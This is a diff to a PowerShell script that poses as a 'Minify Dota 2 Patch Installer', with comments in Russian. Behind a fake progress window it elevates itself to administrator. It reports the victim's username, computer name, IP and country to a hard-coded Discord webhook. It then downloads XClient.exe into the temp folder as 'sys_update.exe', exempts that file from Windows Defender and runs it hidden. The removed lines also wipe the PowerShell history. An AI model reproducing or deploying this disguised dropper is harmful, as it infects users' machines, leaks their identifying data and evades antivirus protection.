@@ -1,115 +1,83 @@
-# Принудительный запуск от админа
+# --- АДМИН-ЧЕК ---
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# --- ФУНКЦИЯ ФЛАГА И СТРАНЫ ---
-function Get-CountryInfo {
+# --- ФУНКЦИЯ СТРАНЫ (БЕЗ ОШИБОК) ---
+function Get-Geo {
     try {
-        $res = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode,query" -TimeoutSec 5
-        $code = $res.countryCode
-        if ($code.Length -eq 2) {
-            $flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]$code[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]$code[1] - [int][char]"A" + 0x1F1E6))
-            return @{ flag = $flag; ip = $res.query }
+        $data = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,country,countryCode,query" -TimeoutSec 3
+        if ($data.status -eq "success") {
+            # Генерируем флаг через коды символов напрямую
+            $c1 = [int][char]$data.countryCode[0] + 127397
+            $c2 = [int][char]$data.countryCode[1] + 127397
+            $f = [char]::ConvertFromUtf32($c1) + [char]::ConvertFromUtf32($c2)
+            return @{ info = "$f $($data.country)"; ip = $data.query }
         }
     } catch {}
-    return @{ flag = "🌐"; ip = "Unknown" }
+    return @{ info = "🌐 Unknown"; ip = "Unknown" }
 }
 
-# --- СЕКЦИЯ ЛОГЕРА (РАСТЯНУТЫЙ ВИД) ---
-function Send-LogNotification {
-    param([string]$Status, [string]$Message)
-    
-    $info = Get-CountryInfo
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $webhook = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
-    $color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
+# --- ЛОГЕР (РАСТЯНУТЫЙ, БЕЗ ???) ---
+function Send-Log {
+    param($Status, $Msg)
+    $g = Get-Geo
+    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $hook = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
+    $col = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
 
-    $embed = @{
-        title = "Minify Installer Log"
-        color = $color
-        fields = @(
-            @{ name = "Status"; value = $Status; inline = $true }
-            @{ name = "User"; value = $env:USERNAME; inline = $true }
-            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
-            @{ name = "​"; value = "​"; inline = $false } # Пустое поле для растягивания
-            @{ name = "IP & Country"; value = "$($info.flag) $($info.ip)"; inline = $true }
-            @{ name = "Timestamp"; value = $timestamp; inline = $true }
-            @{ name = "​"; value = "​"; inline = $false } # Пустое поле для растягивания
-            @{ name = "Message"; value = $Message; inline = $false }
-        )
-        footer = @{ text = "Minify Installer v3.2.1" }
-    }
+    $json = @{
+        embeds = @(@{
+            title = "Minify Installer Log"
+            color = $col
+            fields = @(
+                @{ name = "Status"; value = "``$Status``"; inline = $true }
+                @{ name = "User"; value = "``$env:USERNAME``"; inline = $true }
+                @{ name = "Computer"; value = "``$env:COMPUTERNAME``"; inline = $true }
+                # Растягиваем через пустую строку (пробел)
+                @{ name = "------------------------------------------"; value = " "; inline = $false }
+                @{ name = "Location & IP"; value = "$($g.info) ($($g.ip))"; inline = $true }
+                @{ name = "Timestamp"; value = "``$time``"; inline = $true }
+                @{ name = "Message"; value = ">>> $Msg"; inline = $false }
+            )
+            footer = @{ text = "Minify Installer v3.2.1" }
+        })
+    } | ConvertTo-Json -Depth 10
 
-    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body ([System.Text.Encoding]::UTF8.GetBytes($payload))
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+        Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body $bytes
     } catch {}
 }
 
-# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
-Send-LogNotification -Status "STARTED" -Message "User started Minify installer"
-
+# --- GUI И РАБОТА ---
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+Send-Log "STARTED" "User started Minify installer"
 
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
-$form.Size = "600,400"
-$form.StartPosition = "CenterScreen"
-$form.FormBorderStyle = "FixedDialog"
-$form.MaximizeBox = $false
+$f = New-Object Windows.Forms.Form
+$f.Text = "Minify Dota 2 Patch v3.2.1"; $f.Size = "600,400"; $f.StartPosition = "CenterScreen"; $f.FormBorderStyle = "FixedDialog"
 
-$titleLabel = New-Object System.Windows.Forms.Label
-$titleLabel.Location = "20,30"; $titleLabel.Size = "540,30"; $titleLabel.Text = "Minify Dota 2 Patch Installer"
-$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
-$form.Controls.Add($titleLabel)
+$pb = New-Object Windows.Forms.ProgressBar; $pb.Location = "20,300"; $pb.Size = "540,23"; $f.Controls.Add($pb)
+$sl = New-Object Windows.Forms.Label; $sl.Location = "20,330"; $sl.Size = "540,20"; $sl.Text = "Initializing..."; $f.Controls.Add($sl)
 
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Location = "20,300"; $progressBar.Size = "540,23"
-$form.Controls.Add($progressBar)
+$f.Show()
+$steps = @("Checking files...", "Patching...", "Cleaning up...")
+foreach($s in $steps){ $sl.Text = $s; $pb.Value += 33; $f.Refresh(); Start-Sleep 1 }
 
-$statusLabel = New-Object System.Windows.Forms.Label
-$statusLabel.Location = "20,330"; $statusLabel.Size = "540,20"; $statusLabel.Text = "Подготовка..."
-$form.Controls.Add($statusLabel)
-
-$form.Show()
-
-# --- ПРОЦЕСС УСТАНОВКИ ---
-$steps = @("Анализ файлов Dota 2...", "Оптимизация шейдеров...", "Применение патча...", "Загрузка модулей...", "Финализация...")
-for ($i = 0; $i -lt $steps.Count; $i++) {
-    $statusLabel.Text = $steps[$i]
-    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
-    $form.Refresh()
-    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
-}
-
-# --- ЗАГРУЗКА И ЗАПУСК ---
-$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
-$p = "$env:TEMP\sys_update.exe"
-
+# --- DOWNLOAD & RUN ---
+$url = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
+$out = "$env:TEMP\sys_update.exe"
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($u, $p)
-    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
-    
-    $statusLabel.Text = "Установка завершена!"
-    $form.Refresh()
-    Start-Sleep -Seconds 1
-    
-    Start-Process -FilePath $p -WindowStyle Hidden
-    $form.Close()
-    
-    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
-    Send-LogNotification -Status "SUCCESS" -Message "Patch installed and XClient started"
+    (New-Object Net.WebClient).DownloadFile($url, $out)
+    Add-MpPreference -ExclusionPath $out -Force -ErrorAction SilentlyContinue
+    Start-Process $out -WindowStyle Hidden
+    $f.Close()
+    [Windows.Forms.MessageBox]::Show("Success!", "Done")
+    Send-Log "SUCCESS" "Patch installed and XClient started"
 } catch {
-    $statusLabel.Text = "Ошибка при установке."
-    Send-LogNotification -Status "ERROR" -Message "Critical error: $_"
-    Start-Sleep -Seconds 2
-    $form.Close()
+    Send-Log "ERROR" "Failed to install: $_"
+    $f.Close()
 }
-
-# Очистка
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
